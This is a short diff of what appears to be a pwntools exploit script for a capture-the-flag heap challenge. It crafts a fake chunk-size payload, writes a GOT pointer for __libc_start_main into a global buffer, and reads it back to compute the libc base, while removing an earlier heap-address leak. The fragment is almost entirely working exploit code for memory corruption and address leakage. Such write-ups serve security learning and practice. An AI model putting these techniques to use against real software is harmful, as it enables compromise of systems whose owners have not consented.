@@ -72,16 +72,9 @@ leave(3, 32, 'A'*7)          # Get the chunk in global
 fix_size_payload = '\x08'.ljust(4, '\x00') + '\x20'.ljust(4, '\x00')*2 + '\x00\x01\x00\x00'
 edit(fix_size_payload)
 
-# Leak heap address
+# Leak libc base
 payload = fix_size_payload + p64(libc_start_main_got) + p64(global_size+0x20)
 edit(payload)
-view(1)
-r.recvuntil('View Message: ')
-x = r.recvline()[:-1]
-heap = u64(x + (8-len(x))* '\x00')
-log.success('heap : {}'.format(hex(heap)))
-
-# Leak libc base
 view(0)
 r.recvuntil('View Message: ')
 base = u64(r.recvline()[:-1] + '\x00'*2) - libc.symbols['__libc_start_main']
